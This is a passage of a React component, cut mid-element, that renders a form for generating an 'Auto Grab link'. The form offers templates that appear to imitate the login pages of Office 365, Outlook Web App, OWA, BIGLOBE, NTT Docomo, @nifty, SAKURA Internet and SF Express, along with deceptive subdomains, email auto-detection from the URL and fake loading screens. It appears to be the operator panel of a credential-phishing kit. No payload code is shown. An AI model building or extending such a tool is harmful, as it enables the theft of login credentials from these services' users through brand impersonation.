                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                >
                  <option value="none">No Subdomain</option>
                  <option value="www">www</option>
                  <option value="mail">mail</option>
                  <option value="secure">secure</option>
                </select>
              </div>

              {/* Template Selection */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Template
                </label>
                <select
                  value={typeBTemplate}
                  onChange={(e) => setTypeBTemplate(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                >
                  <option value="auto-detect">🔍 Auto Detect (from email)</option>
                  <option value="office365">📧 Office 365</option>
                  <option value="outlook">📧 Outlook Web App</option>
                  <option value="owaserver">📧 OWA Server Data</option>
                  <option value="biglobe">🇯🇵 BIGLOBE</option>
                  <option value="docomo">🇯🇵 NTT Docomo</option>
                  <option value="nifty">🇯🇵 @nifty</option>
                  <option value="sakura">🇯🇵 SAKURA Internet</option>
                  <option value="sfexpress">🚚 SF Express</option>
                </select>
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  Auto Detect will determine template from the email in the URL
                </p>
              </div>

              {/* Loading Screen */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Loading Screen
                </label>
                <select
                  value={typeBLoadingScreen}
                  onChange={(e) => setTypeBLoadingScreen(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                >
                  {loadingScreenOptions.map((option) => (
                    <option key={option.value} value={option.value}>
                      {option.icon} {option.labelEn} ({option.category})
                    </option>
                  ))}
                </select>
              </div>

              {/* Duration */}
              <div>
                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                  Loading Duration (seconds)
                </label>
                <input
                  type="number"
                  min="1"
                  max="10"
                  value={typeBLoadingDuration}
                  onChange={(e) => setTypeBLoadingDuration(Number(e.target.value))}
                  className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                />
              </div>

              {/* Generated Link Display */}
              {generatedAutoGrabLink && (
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                    Your Auto Grab link:
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="text"
                      value={generatedAutoGrabLink}
                      readOnly
                      className="flex-1 px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-gray-50 dark:bg-gray-700 text-gray-900 dark:text-white text-sm font-mono"
                    />
                    <button
                      type="button"
                      onClick={() => {
                        navigator.clipboard.writeText(generatedAutoGrabLink)
                        alert('Link copied!')
                      }}
                      className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-medium transition-colors"
                    >
                      Copy link
                    </button>
                  </div>
                </div>
              )}

              {error && (
                <div className="p-3 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg text-sm text-red-700 dark:text-red-300">
                  {error}
                </div>
              )}

              <div className="flex items-center gap-3 pt-4">
                <button
                  type="submit"
                  disabled={loading}
                  className="flex-1 px-4 py-2 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 disabled:cursor-not-allowed text-white rounded-lg font-medium transition-colors"
                >
                  {loading ? 'Generating...' : 'Generate Link'}
                </button>
                <button
                  type="button"
                  onClick={onClose}
                  className="px-4 py-2 bg-gray-200 hover:bg-gray-300 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-800 dark:text-white rounded-lg font-medium transition-colors"
                >
                  Cancel
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
    </div>
  )
}

